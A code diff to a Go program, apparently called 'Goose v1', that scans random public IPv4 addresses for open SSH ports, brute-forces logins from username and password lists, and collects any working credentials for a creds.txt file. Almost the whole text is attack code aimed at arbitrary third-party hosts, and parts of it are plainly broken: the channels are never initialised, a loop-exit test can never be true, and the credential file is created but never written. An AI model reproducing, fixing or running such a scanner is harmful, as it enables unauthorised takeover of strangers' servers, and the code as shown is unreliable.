@@ -64,38 +64,42 @@ func sshConnect(ip, username, password string) bool {
 //this function checks if an IP has port 22 open
 func sshScan(ip string) bool {
 	fmt.Println("Scanning " + ip + "...")
-	conn, err := net.DialTimeout("tcp", ip+":22", 25*time.Second)
+	conn, err := net.DialTimeout("tcp", ip+":22", 15*time.Second)
 	time.Sleep(100 * time.Millisecond)
 	if err == nil {
 		conn.Close()
+		fmt.Println("Success! Port 22 is open on " + ip)
+		time.Sleep(100 * time.Millisecond)
 		return true
 	}
+	fmt.Println("Failed!")
+	time.Sleep(100 * time.Millisecond)
 	return false
 }
 
 //this function attempts to connect to the target IP with all possible combinations of usernames and passwords, provided by two list files
-func sshBrute(ip, usernameList, passwordList string) *cred {
+func sshBrute(ch chan *cred, ip, usernameList, passwordList string) {
 	fmt.Println("Brute-forcing " + ip + "...")
 	userlist, err := readFile(usernameList)
 	if err != nil {
 		fmt.Println(err)
-		return nil
 	}
 	passlist, err := readFile(passwordList)
 	if err != nil {
 		fmt.Println(err)
-		return nil
 	}
 	for _, username := range userlist {
 		for _, password := range passlist {
 			if sshConnect(ip, username, password) {
-				return &cred{url: ip, port: 22, username: username, password: password}
+				//this code will put the credentials in the channel
+				ch <- &cred{url: ip, port: 22, username: username, password: password}
+				fmt.Println("Success! Credentials found: " + username + ":" + password + " on " + ip)
+				time.Sleep(100 * time.Millisecond)
 			}
 		}
 	}
 	fmt.Println("Failed!")
 	time.Sleep(100 * time.Millisecond)
-	return nil
 }
 
 //this function generates a random valid IPv4 address
@@ -106,9 +110,6 @@ func genAddress() string {
 }
 
 func main() {
-	// note to self, add an item in the array with cred_list[x] = &cred{url, username, password}
-	//var cred_list = make(creds, 50)
-
 	//adds some FLAVOR to the startup
 	ascii := "✩░▒▓▆▅▃▂▁𝐆𝐨𝐨𝐬𝐞 𝐯𝟏▁▂▃▅▆▓▒░✩"
 	fmt.Println(ascii)
@@ -116,14 +117,33 @@ func main() {
 	max_threads := 10
 	current_threads := 0
 	channels := make([]chan *cred, max_threads)
+	max_creds := 2
+
 	for {
+		if len(channels) == max_creds {
+			break
+		}
+
 		for {
-			if !current_threads < max_threads {
+			addr := genAddress()
+			if !sshScan(addr) || current_threads == max_threads {
 				break
 			}
 			current_threads += 1
-			channels[current_threads-1] := sshBrute(genAddress(), "user.txt", "pass.txt")
-			fmt.Println(cred)
+			go sshBrute(channels[current_threads-1], addr, "user.txt", "pass.txt")
+			fmt.Println(channels[current_threads-1])
 		}	
 	}
+
+	//this code writes the results of the brute-forcing to a file
+	var creds []*cred
+	for i := 0; i < max_threads; i++ {
+		creds = append(creds, <-channels[i])
+	}
+	file, err := os.Create("creds.txt")
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+	defer file.Close()
 }
